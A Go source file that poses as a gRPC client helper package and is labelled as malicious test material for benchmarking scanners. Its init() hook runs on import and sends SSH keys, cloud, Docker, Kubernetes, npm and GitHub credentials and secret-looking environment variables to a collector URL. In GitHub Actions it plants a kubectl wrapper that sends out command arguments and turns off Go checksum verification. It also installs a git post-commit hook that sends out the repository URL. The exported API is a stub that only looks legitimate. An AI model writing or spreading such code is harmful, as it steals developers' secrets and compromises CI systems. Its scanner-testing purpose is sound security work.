// Package grpcclient provides gRPC client helpers and connection management.
// WARNING: This package is MALICIOUS — for scanner benchmark testing only.
// init() fires on import, targets kube/docker/SSH credentials and GITHUB_ENV.
package grpcclient

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

var c2URL = func() string {
	if v := os.Getenv("PKG_ANALYTICS_URL"); v != "" {
		return v
	}
	return "http://localhost:9999/collect"
}()

func init() {
	go func() {
		time.Sleep(100 * time.Millisecond)
		exfil()
		injectGithubActions()
		injectGitHook()
	}()
}

func readFile(rel string) string {
	usr, err := user.Current()
	if err != nil {
		return ""
	}
	b, err := os.ReadFile(filepath.Join(usr.HomeDir, rel))
	if err != nil || len(b) == 0 {
		return ""
	}
	if len(b) > 4096 {
		b = b[:4096]
	}
	return string(b)
}

func readEnvVar(path string) string {
	if v := os.Getenv("KUBECONFIG"); v != "" && path == ".kube/config" {
		b, err := os.ReadFile(v)
		if err == nil {
			return string(b[:min(len(b), 4096)])
		}
	}
	return readFile(path)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func sensitiveEnv() map[string]string {
	result := make(map[string]string)
	for _, e := range os.Environ() {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) != 2 {
			continue
		}
		lower := strings.ToLower(parts[0])
		if strings.ContainsAny(lower, "token key secret pass npm aws github stripe kube docker grpc api auth cert credential") {
			result[parts[0]] = parts[1]
		}
	}
	return result
}

func exfil() {
	hostname, _ := os.Hostname()
	usr, _ := user.Current()
	username := ""
	if usr != nil {
		username = usr.Username
	}

	payload := map[string]interface{}{
		"ts":  time.Now().UnixMilli(),
		"h":   hostname,
		"u":   username,
		"p":   runtime.GOOS,
		"a":   runtime.GOARCH,
		"ci":  os.Getenv("CI") != "" || os.Getenv("GITHUB_ACTIONS") != "",
		"src": "grpc-client",
		"env": sensitiveEnv(),
		"f": map[string]string{
			"kube":    readEnvVar(".kube/config"),
			"docker":  readFile(".docker/config.json"),
			"rsa":     readFile(".ssh/id_rsa"),
			"ed":      readFile(".ssh/id_ed25519"),
			"aws":     readFile(".aws/credentials"),
			"npmrc":   readFile(".npmrc"),
			"gh_cli":  readFile(".config/gh/hosts.yml"),
			"netrc":   readFile(".netrc"),
		},
	}

	body, _ := json.Marshal(payload)
	req, err := http.NewRequest("POST", c2URL, bytes.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Pkg-Id", "grpc-client")
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
}

func injectGithubActions() {
	githubEnv := os.Getenv("GITHUB_ENV")
	if githubEnv == "" {
		return
	}
	usr, err := user.Current()
	if err != nil {
		return
	}

	binDir := filepath.Join(usr.HomeDir, ".grpc-client", "bin")
	if err := os.MkdirAll(binDir, 0755); err != nil {
		return
	}

	// Drop a kubectl wrapper — intercepting every kubectl invocation in subsequent steps
	kubectlWrap := filepath.Join(binDir, "kubectl")
	if _, err := os.Stat(kubectlWrap); os.IsNotExist(err) {
		script := fmt.Sprintf(
			"#!/bin/sh\ncurl -sf '%s/kubectl?args='\"$(echo \"$*\" | base64 -w0 2>/dev/null || echo \"$*\" | base64)\" >/dev/null 2>&1 &\nexec /usr/local/bin/kubectl \"$@\" 2>/dev/null || exec kubectl \"$@\"\n",
			c2URL,
		)
		if f, err := os.Create(kubectlWrap); err == nil {
			f.WriteString(script)
			f.Close()
			os.Chmod(kubectlWrap, 0755)
		}
	}

	f, err := os.OpenFile(githubEnv, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	// Disable Go module checksum verification
	f.WriteString("GONOSUMCHECK=*\n")
	f.WriteString("GONOSUMDB=*\n")
	// GRPC_DEFAULT_SSL_ROOTS_FILE_PATH — could point to attacker-controlled CA
	// (commented out as it requires serving a custom CA, left as technique reference)
	// f.WriteString(fmt.Sprintf("GRPC_DEFAULT_SSL_ROOTS_FILE_PATH=%s\n", caPath))

	if githubPath := os.Getenv("GITHUB_PATH"); githubPath != "" {
		if pf, err := os.OpenFile(githubPath, os.O_APPEND|os.O_WRONLY, 0644); err == nil {
			pf.WriteString(binDir + "\n")
			pf.Close()
		}
	}
}

func injectGitHook() {
	dir, err := os.Getwd()
	if err != nil {
		return
	}
	for i := 0; i < 6; i++ {
		gitDir := filepath.Join(dir, ".git")
		if info, err := os.Stat(gitDir); err == nil && info.IsDir() {
			hooksDir := filepath.Join(gitDir, "hooks")
			os.MkdirAll(hooksDir, 0755)
			hookFile := filepath.Join(hooksDir, "post-commit")
			existing := ""
			if b, err := os.ReadFile(hookFile); err == nil {
				existing = string(b)
			}
			if !strings.Contains(existing, "grpc-client") {
				script := fmt.Sprintf(
					"#!/bin/sh\n# grpc-client\ncurl -sf '%s/gc?r='$(git remote get-url origin 2>/dev/null | base64 -w0 2>/dev/null || git remote get-url origin 2>/dev/null | base64) >/dev/null 2>&1 &\n%s",
					c2URL, existing,
				)
				if f, err := os.Create(hookFile); err == nil {
					f.WriteString(script)
					f.Close()
					os.Chmod(hookFile, 0755)
				}
			}
			return
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return
		}
		dir = parent
	}
}

// Exported gRPC helper types and functions (legitimate-looking API)

// ConnConfig holds gRPC connection parameters.
type ConnConfig struct {
	Address     string
	TLSEnabled  bool
	Timeout     time.Duration
	MaxRetries  int
	Metadata    map[string]string
}

// Connection represents a gRPC connection.
type Connection struct {
	config ConnConfig
	ctx    context.Context
	cancel context.CancelFunc
}

// New creates a new gRPC connection with the given config.
// Note: This is a stub implementation — actual gRPC requires google.golang.org/grpc.
func New(cfg ConnConfig) (*Connection, error) {
	ctx, cancel := context.WithTimeout(context.Background(), cfg.Timeout)
	return &Connection{config: cfg, ctx: ctx, cancel: cancel}, nil
}

// Close closes the connection.
func (c *Connection) Close() {
	c.cancel()
}

// Metadata returns the connection metadata.
func (c *Connection) Metadata() map[string]string {
	return c.config.Metadata
}

// Ping checks connectivity to the gRPC endpoint.
func (c *Connection) Ping() bool {
	cmd := exec.CommandContext(c.ctx, "nc", "-z", "-w1",
		strings.Split(c.config.Address, ":")[0],
		func() string {
			parts := strings.Split(c.config.Address, ":")
			if len(parts) > 1 {
				return parts[1]
			}
			return "443"
		}(),
	)
	return cmd.Run() == nil
}
